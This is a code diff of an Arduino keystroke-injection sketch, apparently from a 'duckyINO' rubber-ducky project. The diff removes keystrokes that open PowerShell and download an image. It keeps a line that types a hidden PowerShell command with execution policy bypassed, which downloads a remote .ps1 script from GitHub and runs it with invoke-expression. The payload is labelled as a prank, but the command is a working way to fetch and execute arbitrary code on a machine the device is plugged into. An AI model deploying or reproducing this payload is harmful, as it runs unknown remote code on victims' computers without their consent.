@@ -7,20 +7,6 @@ void setup() {
 }
 
 void loop() {
-  keyboard.pressKey(GUI, 'x');  // open up powershell
-  keyboard.releaseKey();
-  delay(350);
-  keyboard.pressKey('i');
-  keyboard.releaseKey();
-  delay(1500);
-
-  keyboard.println("Invoke-WebRequest -Uri https://github.com/P-ict0/duckyINO/blob/main/payloads/funny/francer/france.png?raw=true -OutFile france.png;exit");
-
-  delay(800);
-
-  keyboard.pressKey(GUI, 'r');  // open up powershell
-
-  delay(1500);
 
   keyboard.println("powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/P-ict0/duckyINO/main/payloads/funny/francer/francer.ps1?dl=1; invoke-expression $pl");
 
